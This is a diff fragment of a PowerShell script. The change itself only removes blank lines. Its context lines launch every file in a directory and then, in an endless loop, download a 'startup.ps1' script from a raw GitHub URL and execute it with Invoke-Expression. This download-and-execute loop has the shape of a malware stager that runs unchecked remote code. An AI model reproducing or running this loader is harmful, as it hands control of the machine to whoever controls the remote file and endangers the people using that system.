@@ -41,9 +41,6 @@ Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEac
     Start-Process -FilePath $_.FullName
 }
 
-
-
-
 $scriptContent = Invoke-WebRequest -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -UseBasicParsing
 while ($true) {
     Invoke-Expression $scriptContent.Content
